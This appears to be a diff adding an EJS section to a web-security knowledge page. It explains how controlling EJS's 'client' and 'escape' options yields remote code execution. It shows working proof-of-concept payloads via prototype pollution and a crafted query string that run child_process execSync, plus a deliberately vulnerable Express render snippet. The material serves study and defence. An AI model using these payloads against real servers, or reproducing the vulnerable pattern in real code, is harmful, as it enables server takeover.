@@ -78,3 +78,128 @@ Enabling `trust proxy` will have the following impact:
 - `req.ip` and `req.ips` = `X-Forwarded-For`
 
 The trust proxy setting is implemented using the [proxy-addr](https://www.npmjs.com/package/proxy-addr) package. See [docs](https://expressjs.com/en/guide/behind-proxies.html).
+
+## EJS
+
+[Embedded JavaScript templates (EJS)](https://www.npmjs.com/package/ejs) is a NodeJS library very often used by Express to create HTML templates.
+
+### RCE on render compile
+
+The following code is inside EJS ([lib/ejs.js](https://github.com/mde/ejs/blob/v3.1.9/lib/ejs.js#L509) - v3.1.9). If you control the value of both variables `client` and `escape`, you can get a RCE.
+
+```js
+function Template(text, opts) {
+    // ...
+    options.client = opts.client || false;
+    options.escapeFunction = opts.escape || opts.escapeFunction || utils.escapeXML;
+
+    this.opts = options;
+    // ...
+  }
+
+Template.prototype = {
+    // ...
+    compile: function () {
+        var opts = this.opts;
+        var escapeFn = opts.escapeFunction;
+
+        if (opts.client) {
+            src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';' + '\n' + src;
+        }
+        // ...
+        // src is evaluated later
+    }
+}
+```
+
+{{< details "EJS RCE - Proof Of Concept" >}}
+There are two options for controlling these variables.
+
+1. Abuse server-side prototype pollution (SSPP)
+2. Custom parameters to the render function of EJS
+
+#### 1. SSPP
+
+> Full article on [mizu.re](https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce).
+
+**TL;DR:**
+
+```json
+{
+    "__proto__": {
+        "client": 1,
+        "escape": "1;return process.mainModule.require('child_process').execSync('id');"
+    }
+}
+```
+
+#### 2. Custom parameters of render
+
+> Inspired from the challenge *Peculiar Caterpillar* of the [FCSC2023](https://france-cybersecurity-challenge.fr).
+
+`req.query` will be equal to the `options` parameter passed to the `render` function of `Express`.
+
+```js
+require("express")()
+.set("view engine", "ejs")
+.use((req, res) => {
+    res.render("index", { ...req.query })
+})
+.listen(3000);
+```
+
+The `render` function of `Express` calls the `renderFile` function of EJS.
+
+- `render` => `renderFile` => `...` => `Template.new` => `Template.compile`
+
+Here is the code of the `renderFile` function of EJS:
+
+```js
+var _OPTS_PASSABLE_WITH_DATA = ['delimiter', 'scope', 'context', 'debug', 'compileDebug',
+  'client', '_with', 'rmWhitespace', 'strict', 'filename', 'async'];
+
+// ...
+exports.renderFile = function () {
+    var args = Array.prototype.slice.call(arguments);
+    var filename = args.shift();        // arg[0] = PATH of the template
+    var opts = {filename: filename};
+
+    // ...
+    data = args.shift();                // arg[1] = {
+                                        //    "settings": env, view engine, etag, ...,
+                                        //    query string,
+                                        //    "cache": false
+                                        // }
+    viewOpts = data.settings['view options'];
+    if (viewOpts) {
+      utils.shallowCopy(opts, viewOpts);
+    }
+
+    // 'client' is allowed to be copied
+    utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA_EXPRESS);
+    // ...
+
+    return tryHandleCache(opts, data, cb);
+};
+```
+
+The `opts` variable is then passed to the `Template` object. So, we can get a RCE with the following query string.
+
+```
+?settings[view options][escape]=1;return+process.mainModule.require("child_process").execSync("id").toString();
+&client=1
+```
+
+This query string is equals to:
+
+```json
+{
+  settings: {
+    'view options': {
+      escape: '1;return process.mainModule.require("child_process").execSync("id").toString();'
+    }
+  },
+  client: '1'
+}
+```
+{{< /details >}}
